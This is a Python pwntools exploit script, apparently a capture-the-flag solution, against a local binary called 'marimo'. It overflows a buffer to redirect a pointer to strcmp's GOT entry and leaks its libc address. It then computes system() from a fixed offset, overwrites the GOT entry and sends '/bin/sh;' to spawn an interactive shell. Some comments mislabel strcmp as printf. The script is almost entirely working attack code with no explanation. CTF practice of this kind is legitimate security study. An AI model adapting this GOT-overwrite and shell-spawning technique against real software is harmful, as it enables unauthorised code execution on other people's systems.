from pwn import *
import time

#context.update(arch='amd64', os='linux', log_level='debug')
p = process('marimo')

def createMoss(ch):
    p.sendline('show me the marimo')
    p.sendlineafter('name? (0x10)', ch*0x10)
    p.sendlineafter(')\n', ch*0x32)
    

p.recvrepeat(0.2)
createMoss('a')
p.recvrepeat(0.2)
createMoss('b')
p.recvrepeat(0.2)
p.sendline('V')


time.sleep(3)

#overwrite moss[1]'s profile address to printf
elf = ELF('marimo')
got_strcmp = elf.got['strcmp']
log.info('got_printf : ' + hex(got_strcmp))
offset_to_m1name = 0x38
p.sendlineafter('>> ', '0')
p.recvuntil('time : ')
cur_time = int(p.recvline().replace('\n', ''),10)
p.sendlineafter('>> ', 'M')
p.sendlineafter('>> ','a'*(offset_to_m1name-8)+p32(cur_time)+p32(0x10)+p64(got_strcmp)*2)
p.sendlineafter('>> ', 'B')


#into View moss
p.recvrepeat(0.2)
p.sendline('V\x03')


#leak printf in libc
p.sendlineafter('>> ', '1')
p.recvuntil('name : ')
addr_strcmp = u64(p.recvline().replace('\n', '').ljust(8, '\x00'))
log.info('addr of strcmp: ' + hex(addr_strcmp))


#overwrite strcmp's got to system
p.sendlineafter('>> ', 'M')
offset_unknown = 0x111390
addr_system = addr_strcmp - offset_unknown
log.info('addr_system : {0} - {1} = {2}'.format(hex(addr_strcmp), hex(offset_unknown), hex(addr_system)))
p.sendlineafter('>> ', p64(addr_system))
p.sendlineafter('>> ', 'B')


#execute /bin/sh 
p.recvrepeat(0.2)
p.sendline('/bin/sh;')
p.interactive()








